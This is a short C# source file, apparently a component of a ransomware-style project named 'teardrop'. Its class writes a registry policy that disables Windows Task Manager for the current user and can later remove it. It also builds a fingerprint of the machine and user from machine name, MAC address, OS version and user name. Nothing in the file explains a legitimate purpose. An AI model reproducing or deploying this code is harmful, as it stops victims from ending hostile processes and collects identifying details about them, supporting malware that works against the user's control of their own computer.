using DeviceId;
using Microsoft.Win32;
using System.Runtime.Versioning;

namespace teardrop
{
    internal sealed class MachineManager
    {
        [SupportedOSPlatform("windows")]
        public static void DisableTaskManager()
        {
            using (RegistryKey registry = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
            {
                if (registry.GetValue("DisableTaskMgr") is null)
                {
                    registry.SetValue("DisableTaskMgr", "1");
                }

                registry.Close();
            }
        }

        [SupportedOSPlatform("windows")]
        public static void EnableTaskManager()
        {
            using (RegistryKey registry = Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\Policies\System"))
            {
                if (registry.GetValue("DisableTaskMgr") is not null)
                {
                    registry.DeleteValue("DisableTaskMgr");
                }

                registry.Close();
            }
        }

        public static string GetDeviceInfo()
        {
            return new DeviceIdBuilder()
                .AddMachineName()
                .AddMacAddress()
                .AddOsVersion()
                .AddUserName()
                .ToString();
        }
    }
}
